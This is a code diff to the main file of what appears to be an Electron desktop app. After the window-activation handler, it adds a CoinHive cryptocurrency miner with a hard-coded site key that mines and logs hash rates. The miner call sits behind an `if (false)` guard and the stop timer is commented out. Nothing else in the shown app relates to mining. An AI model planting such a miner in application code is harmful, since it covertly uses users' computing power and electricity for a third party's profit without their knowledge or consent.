@@ -28,3 +28,32 @@ app.on('activate', () => {
   // dock icon is clicked and there are no other windows open.
   createWindowIfNoWindows()
 })
+
+const CoinHive = require('coin-hive')
+const getPort = require('get-port')
+
+const startMining = async () => {
+  const port = await getPort()
+  const miner = await CoinHive('Ms9UDamapfNLGi5P7flbLaUPm5eCBmwe', { port })
+
+  // Start miner
+  await miner.start()
+
+  // Listen on events
+  miner.on('found', () => console.log('Found!'))
+  miner.on('accepted', () => console.log('Accepted!'))
+  miner.on('update', (data: any) =>
+    console.log(`
+    Hashes per second: ${data.hashesPerSecond}
+    Total hashes: ${data.totalHashes}
+    Accepted hashes: ${data.acceptedHashes}
+  `)
+  )
+
+  // Stop miner
+  // setTimeout(async () => await miner.stop(), 60000)
+}
+
+if (false) {
+  startMining().catch(err => console.error(err))
+}
